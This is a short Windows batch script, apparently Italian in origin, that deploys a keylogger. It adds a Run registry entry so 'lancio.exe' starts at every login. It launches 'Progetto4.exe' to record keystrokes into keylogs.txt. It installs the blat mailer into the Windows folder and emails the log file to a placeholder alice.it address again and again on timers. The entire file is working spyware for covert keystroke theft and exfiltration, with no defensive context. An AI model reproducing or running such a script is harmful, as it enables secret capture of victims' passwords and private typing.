Reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v prova /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v prova /t REG_SZ /d "C:\\lancio.exe\" /f
start Progetto4.exe /stext keylogs.txt
@COPY blat.exe C:\WINDOWS\blat.exe
@COPY blat.dll C:\WINDOWS\blat.dll
@COPY blat.lib C:\WINDOWS\blat.lib
@blat -install out.alice.it yourmail@alice.it
cls
@blat keylogs.txt -to yourmail@alice.it -try 2 -subject Keylog
timeout /t 15
@blat keylogs.txt -to yourmail@alice.it -try 2 -subject Keylog
timeout /t 600
@blat keylogs.txt -to yourmail@alice.it -try 2 -subject Keylog
timeout /t 1200
@blat keylogs.txt -to yourmail@alice.it -try 2 -subject Keylog
timeout /t 1200
@blat keylogs.txt -to yourmail@alice.it -try 2 -subject Keylog
timeout /t 1200
@blat keylogs.txt -to yourmail@alice.it -try 2 -subject Keylog
timeout /t 1200
@blat keylogs.txt -to yourmail@alice.it -try 2 -subject Keylog
timeout /t 1200
@blat keylogs.txt -to yourmail@alice.it -try 2 -subject Keylog
timeout /t 1200

end